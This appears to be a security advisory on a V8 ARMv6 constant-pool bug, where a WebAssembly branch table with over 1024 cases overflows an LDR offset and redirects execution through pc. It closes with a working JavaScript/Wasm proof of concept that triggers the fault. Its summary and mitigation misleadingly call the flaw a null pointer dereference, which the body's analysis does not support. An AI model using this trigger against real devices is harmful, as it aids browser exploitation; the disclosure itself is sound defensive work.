Summary
A null pointer dereference has been discovered in V8 compiler which affects the latest version.
This vulnerability allows an attacker to bypass a security mitigation.

Details
ARM (unlike X86) uses fxed length 32-bit opcodes. This means that it cannot encode a 32-bit
literal immediate value for an instruction to operate on. In many places within the V8 compiler, a
operation on an immediate literal is required. In x86 these are encoded directly into the
instruction. On ARM there is a concept of a "Constants Pool", where 32 bit literals are embedded
in a pool within the machine-code. A PC-relative load is used to load these literals into a register
prior to whichever operation is required. The PC-relative load instruction ldr has a limited offset
range of 12-bits which can be encoded within the instruction. This means that a const pool must
be emitted within 4095 bytes range of the ldr instruction which loads from it. V8 manages this
by caching up constant pool entries, then checking every so often (with CheckConstPool) when
an instruction is emitted whether a constant pool would be required before the next scheduled
check. If required, a constant pool would be emitted, along with a b instruction to jump over the
non-code data.

The logic that ensures the constants pools are always emitted "in range" is sound, however there
is an additional mechanism BlockConstPoolFor which allows the emission of the constant
pool to be blocked. This mechanism is designed to be used for small sections of code which
must be physically contiguous. The CheckConstPool mechanism has enough margin for error
built into its calculations to allow for this. The function AssembleArchTableSwitch produces
jump-tables in ARM which are structured as an array of b instructions, with a computed jump into
the table which selects which of the jump cases will be taken.

void CodeGenerator::AssembleArchTableSwitch(Instruction* instr) {
 ArmOperandConverter i(this, instr);
 Register input = i.InputRegister(0);
 size_t const case_count = instr->InputCount() - 2;
 // Ensure to emit the constant pool first if necessary.
 __ CheckConstPool(true, true); [2]
 __ cmp(input, Operand(case_count)); [3]
 __ BlockConstPoolFor(case_count + 2); [1]
 __ add(pc, pc, Operand(input, LSL, 2), LeaveCC, lo);
 __ b(GetLabel(i.InputRpo(1)));
 for (size_t index = 0; index < case_count; ++index) { [4]
 __ b(GetLabel(i.InputRpo(index + 2)));
 }
}
At [1] this structure is marked with BlockConstPoolFor in order to prevent constant pool
emission within the jump table. If you were in a situation where a constant pool was just about to
be emitted, then you entered CodeGenerator::AssembleArchTableSwitch, this could cause
the constant pool window to be overrun.

To work around this, at [2] CheckConstPool(true, true) is used to force_emit a constant pool
prior to the jump table. This causes all pending constants to be emitted.

However, there is an oversight at [3], The cmp instruction that is emitted compares the register
input against the literal case_count. Which may cause a new constant to be required.

cmp calls through to AddrMode1.

void Assembler::cmp(Register src1, const Operand& src2, Condition cond) {
 AddrMode1(cond | CMP | S, no_reg, src1, src2);
}
void Assembler::mov(Register dst, const Operand& src, SBit s, Condition cond) {
 AddrMode1(cond | MOV | s, dst, no_reg, src);
}
void Assembler::AddrMode1(Instr instr, Register rd, Register rn, const Operand& x) {
 /* ... */
 if (!AddrMode1TryEncodeOperand(&instr, x)) { [5]
 DCHECK(x.IsImmediate());
 /* ... */
 Condition cond = Instruction::ConditionField(instr);
 if ((opcode == MOV) && !set_flags) {
 // Generate a sequence of mov instructions or a load from the constant
 // pool only for a MOV instruction which does not set the flags.
 DCHECK(!rn.is_valid());
 Move32BitImmediate(rd, x, cond); [7]
 } else if ((opcode == ADD) && !set_flags && (rd == rn) && !temps.CanAcquire()) {
 /* ... */
 } else {
 // The immediate operand cannot be encoded as a shifter operand, so load
 // it first to a scratch register and change the original instruction to
 // use it.
 // Re-use the destination register if possible.
 Register scratch = (rd.is_valid() && rd != rn && rd != pc) ? rd : temps.Acquire();
 mov(scratch, x, LeaveCC, cond); [6]
 AddrMode1(instr, rd, rn, Operand(scratch));
 }
 return;
 }
 /* ... */
} 

Move32BitImmediate has two branches, if UseMovImmediateLoad returns true, a pair of
instructions that each load 16- bits of immediate (movw andmovt ) are used to populate the
literal. This case is taken on devices that support ARMv7, and prevents this vulnerability from
being accessible on these devices. On ARMv6 devices and below, the else case is taken.
At [8] a new constant pool entry is added containing our immediate.
At [9] a pc-relative LDR is emitted to load this. In this code the imm12 of the ldr_pcrel is a
dummy stand-in value, that will be patched with the offset to the constant pool when it is fnally
emitted. This patching is done in SetLdrRegisterImmediateOffset.
void Assembler::Move32BitImmediate(Register rd, const Operand& x,
 Condition cond) {
 if (UseMovImmediateLoad(x, this)) {
 /* ... */
 } else {
 int32_t immediate;
 /* ... */
 immediate = x.immediate();
 ConstantPoolAddEntry(pc_offset(), x.rmode_, immediate); [8]
 ldr_pcrel(rd, 0, cond); [9]
 }
}
The call to AddrMode1TryEncodeOperand at [5] always returns false in this case, as this
checks whether the current instruction allows literals to be embedded within it, cmp does not
allow this.
So we hit the call to mov at [6] which tries to move our immediate x to a scratch register for use
in the cmp instruction.
mov calls back into AddrMode1, but this time we take call Move32BitImmediate at [7].
If we have more than 1024 (minus a few for other instructions) cases in our jump-table, then the
range between the LDR instruction and the constant pool entry will overfow the 12-bits of literal
space available within the instruction.
Due to how the offset is patched at [10] this allows the bits above 12 within our offset to overfow
and incorrectly set higher bits within the instruction emitted, changing the function of the
instruction.

 Instr Assembler::SetLdrRegisterImmediateOffset(Instr instr, int offset) {
 DCHECK(IsLdrRegisterImmediate(instr));
 bool positive = offset >= 0;
 if (!positive) offset = -offset;
 DCHECK(is_uint12(offset));
 // Set bit indicating whether the offset should be added.
 instr = (instr & ~B23) | (positive ? B23 : 0);
 // Set the actual offset.
 return (instr & ~kOff12Mask) | offset; [10]
}
In the POC we change the Rd destination register of the load, so that it loads pc register and
causes a jump to an malformed address. For example:
0x3bb2f5b4 14 e59ff010 ldr pc, [pc, #+16] (addr 0x3bb2f5cc)
0x3bb2f5b8 18 e150000c cmp r0, ip
0x3bb2f5bc 1c 308ff100 addcc pc, pc, r0, lsl #2
0x3bb2f5c0 20 ea000c02 b +12304 -> 0x3bb325d0 <+0x3030>
0x3bb2f5c4 24 ea0021ea b +34736 -> 0x3bb37d74 <+0x87d4>
0x3bb2f5c8 28 ea000c05 b +12316 -> 0x3bb325e4 <+0x3044>
0x3bb2f5cc 2c ea0021e8 b +34728 -> 0x3bb37d74 <+0x87d4>
0x3bb2f5d0 30 ea000c06 b +12320 -> 0x3bb325f0 <+0x3050>
0x3bb2f5d4 34 ea0021e6 b +34720 -> 0x3bb37d74 <+0x87d4>
...
This would cause a jump to 0xea0021e8. Controlling this jump would be somewhat hard, as the
only data available to be loaded by the ldr is the opcodes of the b <addr> instructions within.
Additionally, we are limited to only setting bits, in the instruction, never unsetting them. Finally
each bit that we want to set in the opcode requires 2^(n-2) cases within our jump table.


Proof Of Concept
This code depends on wasm-constants.js and wasm-module-builder.js from the V8 source
tree. Additionally to run d8 on a newer device in ARMv6 mode the fag --arm_arch armv6 flag
 can be used
log("Starting WASM Builder");
let builder = new WasmModuleBuilder();
let body = [];
// We're going to overflow the 12-bit immediate of an LDR instruction to set bits
// in the register part of the instruction. We want to set the bottom two bits
// which will flip `ip` to `pc`
const bits_to_set = 0x3000;
// Each switch case we add to our branch table adds four-bytes to the LDR offset.
const NUM_CASES = (bits_to_set/4) + 1;
// Enter the nested code blocks
for (let i=0; i<NUM_CASES; i++) {
 body.push(kExprBlock);
 body.push(kWasmStmt);
}
// Add a BrTable which selects a code block based on arg0
 body.push(kExprBlock);
 body.push(kWasmStmt);
 body.push(kExprGetLocal, 0);
 body.push(kExprBrTable, ...varuint32(NUM_CASES));
 for (let i=0; i<NUM_CASES; i++) {
 body.push(...wasmI32Const(i));
 }
 body.push(0); // default case
 body.push(kExprEnd);
// Add returns from 4096 nested blocks
for (let i=0; i<NUM_CASES; i++) {
 body.push(...wasmI32Const(i));
 body.push(kExprReturn);
 body.push(kExprEnd);
}
// Default return value
body.push(...wasmI32Const(-1));
builder.addFunction('main', kSig_i_i)
UK OFFICIAL SENSITIVE COMMERCIAL
UK OFFICIAL SENSITIVE COMMERCIAL
 .addBody(body)
 .exportFunc();
log("Constructed WASM layout");
let buffer = builder.toBuffer(true);
log("Built WASM buffer");
let mod = new WebAssembly.Module(buffer);
log("Built WASM Module");
let inst = new WebAssembly.Instance(mod, {});
log("Instantiated WASM Module");
inst.exports.main(0)

Mitigation
Address the null pointer deference.